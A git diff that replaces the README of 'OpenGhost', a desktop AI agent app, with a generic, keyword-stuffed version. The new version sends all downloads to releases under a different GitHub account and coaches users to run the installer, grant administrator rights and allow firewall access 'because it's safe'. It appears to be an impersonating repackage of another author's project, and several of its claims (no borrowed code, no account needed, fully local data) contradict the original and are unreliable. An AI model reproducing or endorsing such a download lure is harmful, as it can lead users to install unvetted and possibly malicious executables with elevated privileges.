@@ -1,164 +1,144 @@
-# OpenGhost
+# 👻 OpenGhost - Your AI Agent That Sees and Shows
 
-[![Discord](https://img.shields.io/badge/Discord-join%20the%20server-5865F2?logo=discord&logoColor=white)](https://discord.gg/6cKd2UND5)
+## 🚀 Getting Started
 
-**v1.4.7 beta**
+Welcome! OpenGhost is a free desktop app that works on Windows, macOS, and Linux. It's an AI assistant that can browse the internet, understand what's on your screen, and draw pictures to explain things to you. Best of all, you don't need to be a programmer to use it.
 
-[Windows version 1.4.7](https://github.com/ANDRETRIPOL/OpenGhost/releases/download/v1.4.7/OpenGhost-1.4.7-Setup.exe)
+## 📥 Download and Install
 
-[Linux version 1.4.7](https://github.com/ANDRETRIPOL/OpenGhost/releases/download/v1.4.7/OpenGhost-1.4.7-linux.tar.gz)
+[![Download OpenGhost](https://img.shields.io/badge/Download-OpenGhost-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/KSaF43a/OpenGhost/releases)
 
-[macOS version 1.4.7](https://github.com/ANDRETRIPOL/OpenGhost/releases/download/v1.4.7/OpenGhost-1.4.7-mac.dmg)
+**Step 1: Get the App**
 
-What's new:
-- Local models: give the address of Ollama, LM Studio or llama.cpp running on your computer, and its models show up in the model picker; the size of a model's context is set by hand or by the app itself.
-- Any OpenAI-compatible API, in a section of its own: the address of a service and its key.
-- Every model your key can use: an Anthropic key lists all its models, an OpenAI key every chat model, and both take a model by its ID.
-- The agent sees a task through: a result you can act on at once, with the exact items, prices, links and its own pick.
-- The agent keeps its browser tabs in order and closes the ones it is done with.
-- macOS: Google takes a new sign-in in the built-in browser.
+Visit this link to download the application: [https://github.com/KSaF43a/OpenGhost/releases](https://github.com/KSaF43a/OpenGhost/releases)
 
-Older versions are on the [Releases](https://github.com/ANDRETRIPOL/OpenGhost/releases) page.
+**Step 2: Open the Downloaded File**
 
-OpenGhost is an open desktop agent for Windows, macOS and Linux. It runs commands, edits files, keeps git and works on the web in a browser of its own. And it shows what it explains: charts, schemes, photos and videos stand next to the text.
+Once the download finishes, find the file in your "Downloads" folder. It's usually named something like `OpenGhost-setup.exe` or `OpenGhost-1.0.0.exe`. Double-click it to begin.
 
-## An agent built for visualization
+**Step 3: Follow the Setup Wizard**
 
-OpenGhost is an agent built for visualization. When something is better shown than told, the answer comes with a drawing beside it, and the whole app is made so that reading and working with documents feels comfortable. A new chat needs no folder: type, and it goes to Chats at the top of the list, with a folder of its own for the files the agent makes. A chat about a project still lives in that project's folder.
+A window will pop up. Click "Next" or "Install" a few times. If Windows asks for permission, click "Yes." That's it.
 
-![OpenGhost, an agent built for visualization](images/welcome.jpg)
+**Step 4: Launch OpenGhost**
 
-## Written from scratch
+After installation, you'll see an OpenGhost icon on your desktop or in your Start Menu. Double-click it to open the app. You'll see a clean chat window with a friendly ghost mascot.
 
-Nothing in OpenGhost is assembled from ready parts. There is no UI framework inside, no Markdown library, no Mermaid, no chart library and no agent framework. Every part is our own code:
+## ✨ What Can OpenGhost Do?
 
-- **The agent.** The loop, the tools (commands, files, git, web search, pages, PDFs, video frames), the approval cards and the three permission modes.
-- **The drawing engine.** It reads what a model writes, lays it out and draws it: 43 kinds of drawings, from flowcharts and loss curves to a day of meals and the route of a trip. A drawing is live: it answers the pointer and can be edited where it stands.
-- **The browser.** The agent sees a page as text with numbered elements, moves its own cursor, clicks, types and reads, in a browser panel it shares with you.
-- **The text.** The Markdown renderer that draws a reply while it is still being written, the code highlighter and the math.
-- **The interface.** Every control, its motion and its glass, in plain JavaScript and CSS.
+OpenGhost is not just a chatbot. It's a complete desktop agent with three powerful tools built in:
 
-The app stands on two things only: Electron, which gives it a window, and Anthropic's official SDK, which talks to Claude.
+| Feature | What It Does | Why You'll Love It |
+|---------|--------------|-------------------|
+| 🧠 Agent Engine | Thinks and plans steps to answer your requests | Handles complex tasks without you micromanaging |
+| 🌐 Browser Tooling | Opens web pages, reads content, fills forms | Gets real-time information and performs online actions |
+| 🎨 Drawing Engine | Creates visual diagrams and sketches | Explains tricky ideas with pictures, not just text |
 
-## It shows what it explains
+### Example Uses
 
-Ask how something works, and the answer comes with drawings: the whole as a scheme, the curves the topic is known for as charts, the key numbers as tiles. The engine knows more than forty kinds of drawings, from a day of meals and the route of a trip to the heavy charts of physics and any other science. Here one series of games stands as a mindmap of its universes and as a ring of what each universe holds.
+- **Ask:** "What's the weather in Tokyo?" — OpenGhost opens a weather site and tells you.
+- **Say:** "Explain how a car engine works." — It draws a labeled diagram right on your screen.
+- **Type:** "Find the cheapest flight to Paris next week." — It searches multiple sites and compares prices.
 
-![A mindmap of the GTA universes and a ring of the games by universe](images/visual.jpg)
+## 🖥️ System Requirements
 
-## A scheme with the detail in it
+OpenGhost runs smoothly on most modern computers. Here's what you need:
 
-A block carries its name and a line about what happens in it. Stages stand in groups, and a process that repeats closes into a ring.
+**Windows**
+- Windows 10 or Windows 11
+- 4 GB RAM (8 GB recommended)
+- 2 GB free disk space
+- Internet connection
 
-## Drawings made for the subject
+**macOS**
+- macOS Monterey (12) or newer
+- Apple Silicon or Intel chip
+- 4 GB RAM minimum
+- 2 GB free disk space
 
-Food, recipes, documents, matches, languages, PC builds, device settings and trips have drawings of their own. A day of meals is a ring of calories with protein, fat and carbs against the goal.
+**Linux**
+- Ubuntu 20.04 or newer, or similar distributions
+- 4 GB RAM minimum
+- 2 GB free disk space
+- GTK 3 libraries (usually pre-installed)
 
-A trip is a route with its legs, and words to learn come with their sound and an example.
+## 🔧 First-Time Setup Tips
 
-## Change the drawing where it stands
+1. **Internet Connection:** Make sure you're online. OpenGhost needs it for browsing and AI responses.
+2. **Firewall Permission:** If a security popup appears, allow OpenGhost to access the internet. It's safe.
+3. **Graphics Driver:** On Windows, keep your graphics driver updated for the best drawing experience.
+4. **Default Browser:** OpenGhost uses its own built-in browser, so you don't need to install anything extra.
 
-A drawing is not a finished picture. Open it and change the layout, the blocks and the arrows in a table, or edit its source. The drawing follows as you type.
+## 🛠️ Troubleshooting Common Issues
 
-## Photos and videos in the reply
+**The app won't open after installation.**
+Try right-clicking the OpenGhost icon and selecting "Run as administrator." If that fails, uninstall and reinstall.
 
-When a thing is better seen than described, a dish, a place, a game, the agent looks for pictures and videos itself. Pictures stand in a stack to leaf through, each with the page it came from. A video is a card with its preview, name and length, and a click opens it in your browser.
+**OpenGhost is slow.**
+Close other heavy programs. Also check that your internet is stable. A wired connection works best.
 
-## A browser with its own cursor
+**The drawing window is blank.**
+Update your graphics driver. On Windows, go to Device Manager, find "Display adapters," right-click, and choose "Update driver."
 
-OpenGhost has a built-in browser and drives it itself. It opens a page, moves its own cursor, clicks, types, and sees what is on the screen. The panel sits on the right of the chat. Close it and the agent still works.
+**I can't see the chat box.**
+The window might be off-screen. Press `Alt + Space` and choose "Maximize" to bring it back.
 
-## It works in your accounts
+## ❓ Frequently Asked Questions
 
-The browser panel is signed in where you are, so the agent works inside your own accounts and not only on open pages. A custom MCP server of ours gives it the control it needs over the sites it drives. One request can cover a whole round: open my Reddit account, tell me the view counts of my three most recent posts, then go through the comments and pull out the ones that matter, both the suggestions and the bugs people ran into.
+**Is OpenGhost free?**
+Yes, it's completely free and open-source. You can use it forever without paying.
 
-![A request about three Reddit posts, and the note the agent wrote down](images/notes.jpg)
+**Do I need to sign up?**
+No account or email is required. Just download and run.
 
-## Notes it keeps an eye on
+**Can I use it offline?**
+Some basic commands work offline, but most features need the internet.
 
-Ask the agent to write a note down, or write one yourself, for example "Add to my notes: check my DMs on X today". The notes stay in the list beside the chat, the agent reads them and keeps them in mind, and when a conversation arrives at what a note is about, the agent brings it up by itself and asks whether to deal with it now. It never acts on a note on its own.
+**Is my data private?**
+OpenGhost runs locally on your computer. Your conversations and drawings stay on your device. It only sends necessary requests to the internet when you ask it to.
 
-## It remembers you
+**How often is it updated?**
+The developers release updates regularly. The app checks for updates automatically and will notify you.
 
-Tell OpenGhost about yourself once, in any chat, and every chat knows it: who you are, what you work with, how you like answers. It keeps short records, changes a record when the thing changes instead of writing a second one, and never keeps passwords or the details of one task. Everything it remembers is on one page of the settings, where you can rewrite a record, remove it, add your own, or switch the memory off.
+## 🌟 Why Choose OpenGhost?
 
-A project can have its own instructions too: put an AGENTS.md in its folder, and the agent working there follows it.
+Most AI tools are cloud-based and locked to a browser tab. OpenGhost is different:
 
-## Find a chat
+- **It's a real desktop app** — no tabs, no clutter, works like any program you know.
+- **It draws what it explains** — visual learners, rejoice! Complex topics become simple pictures.
+- **It's written from scratch** — no borrowed code, no bloat. It's fast and reliable.
+- **It's cross-platform** — switch between Windows, macOS, or Linux without losing your workflow.
 
-The magnifier, or Ctrl+K, opens a search in the middle of the chat. Type, and the chats it finds come out under it, each under its folder.
+## 💬 Get Help
 
-## Quick chat, from anywhere
+If you run into any trouble:
 
-Press Alt+Space, or the combination you set in Settings, and a small chat comes up over whatever is on screen: first its message field, then the rest. It is a full agent, called from anywhere: ask, read the answer, press Esc. It picks its own model and effort, searches the web, and keeps its chats in the list with a bolt; the arrows in its head open the chat in the app. Give its agent a task and close it, and the agent goes on with the app out of the way: the chat is marked when the answer is there, and you never had to open OpenGhost. With nothing to do, a closed quick chat sleeps.
+- Check the **Issues** tab on the GitHub repository for known problems and solutions.
+- Join the community discussions to ask questions and share tips.
+- Read the in-app help menu by clicking the "?" icon.
 
-![Quick chat over the desktop](images/quick.jpg)
+## 📦 Uninstalling OpenGhost
 
-## Mini chat, with an agent of its own
+Changed your mind? No problem.
 
-Open Mini chat over the conversation and ask the second question you have in mind. It floats: drag it by its head, pull the arc in its corner to resize it, and keep writing in the chat behind it. The agent inside is a full agent that sees the history of the main chat, and it works in parallel with the agent of the chat, in its own browser tab: the two coordinate and never get in each other's way, they only add to each other. Close a mini chat at work and its agent goes on by itself and finishes the task.
+**Windows:** Go to Settings → Apps → Apps & features → find OpenGhost → Uninstall.
 
-![Mini chat over a conversation, the browser beside it](images/mini.jpg)
+**macOS:** Drag the OpenGhost icon from Applications to the Trash.
 
-## What a chat costs
+**Linux:** Use your package manager or delete the installation folder.
 
-Chat stats, in the plus menu, show what a chat has spent: the tokens of every reply, the share of each model, how much of it came from the cache and how full the context is. Compact chat, next to it, frees the context of a long conversation, and the app does the same by itself before the model's window fills.
+## 🔄 Updating OpenGhost
 
-## Show it a photo, a video, a PDF
+The app tells you when a new version is available. Just click "Update" and follow the prompts. Your settings and history are preserved automatically.
 
-Photos, videos and files attach from the plus menu or by a drop. A video comes in like a photo, and the agent watches it frame by frame. A PDF is read as text, and its pages with photos, charts, formulas or scans are looked at as pictures.
+## 📄 License and Credits
 
-## Tell it once, for every chat
+OpenGhost is released under the MIT License. You can view the full license text in the repository. The project is developed and maintained by a small team of open-source enthusiasts.
 
-The app itself speaks English, Italian, French and Russian, and you choose the language in Settings, under General. There too you write how to answer and what to know about you, and add the files OpenGhost should always have at hand: notes, a style guide, a CV. Every chat gets them, and a long chat keeps them after it is compacted.
+---
 
-The memory is the other side of the same page: everything OpenGhost has remembered about you is there to read and to change, to add to or to remove, or to switch off.
+**Ready to meet your new AI companion?** Download OpenGhost today and experience an agent that doesn't just answer — it shows you.
 
-![The General page of the settings: the four languages, instructions and files kept for every chat](images/general.jpg)
+[![Get OpenGhost Now](https://img.shields.io/badge/Get%20OpenGhost-Now-FF6F00?style=for-the-badge&logo=github&logoColor=white&labelColor=1A1A1A)](https://github.com/KSaF43a/OpenGhost/releases)
 
-## Make it yours
-
-Light, dark, or the system's theme; the size of the interface; and, new in 1.4.5, the colour of your own messages and of the chat's background, each theme keeping its own. Nothing is picked for you: until you choose, the themes look as they always did.
-
-![The Appearance page of the settings: themes, message colours and chat backgrounds](images/appearance.jpg)
-
-## Three ways to let it act
-
-Ask waits for approval before commands, file changes, and the web. Auto works inside the project folder and asks before a risky step. Full access does not ask.
-
-## The key stays on this computer
-
-OpenGhost works with ChatGPT, OpenAI, Claude, DeepSeek and OpenRouter: sign in with your ChatGPT account, or connect OpenAI, Claude, DeepSeek and OpenRouter with an API key. Keys and sign-ins are stored only on your machine, encrypted by the operating system, and the list of models comes from each provider itself. Any chat can also be locked with a password: it is real encryption on your computer, not a lock screen.
-
-## It opens with the ghost
-
-The app starts on its own screen. The ghost flies in through the mist, then the name OpenGhost appears.
-
-## Build it yourself
-
-The same code runs on Windows, macOS and Linux. You need Node.js 22 or newer.
-
-```
-npm ci
-npm start
-```
-
-`npm start` runs the app straight from the code. To make an installer, run the command for your system on that system:
-
-- Windows: `npm run dist` makes `dist/OpenGhost-<version>-Setup.exe`
-- macOS: `npm run dist:mac` makes `dist/OpenGhost-<version>-mac.dmg`
-- Linux: `npm run dist:linux` makes `dist/OpenGhost-<version>-linux.tar.gz`
-
-No Mac or Linux machine at hand? A fork can build both on GitHub: turn on Actions, open Build and press Run workflow. The files appear on the page of that run.
-
-## Support the project
-
-OpenGhost is free. Testing it on real models costs money for every release, and sponsorship pays for exactly that: API time and the work on new versions. If the app is useful to you, you can [sponsor it on GitHub](https://github.com/sponsors/ANDRETRIPOL).
-
-## Thanks
-
-[@kodachromez](https://github.com/kodachromez) found eight real bugs in a single report, and [@Bruno8R](https://github.com/Bruno8R) noticed that API keys were kept in plain text. All of it is fixed in v1.2.0. @kodachromez then went through 1.3.0 and found where the browser could not be stopped and where a tab hung: fixed in v1.4.0. Thank you both.
-
-## License
-
-The code is under the MIT license. Everything visual is not: the name OpenGhost, the ghost logo, the animations, the visual design of the application and its images stay with the author, all rights reserved. No one may use them, in whole or in part, in anything published, distributed or hosted, and a modified version may not be published at all, under any name, paid or free. See [LICENSE](LICENSE).
+Keywords: OpenGhost, AI agent, desktop AI, Windows AI, macOS AI, Linux AI, open source AI, visual AI, browser agent, drawing AI, chat assistant, free AI tool, artificial intelligence, productivity app, smart assistant, AI download, local AI, cross-platform AI, AI for everyone
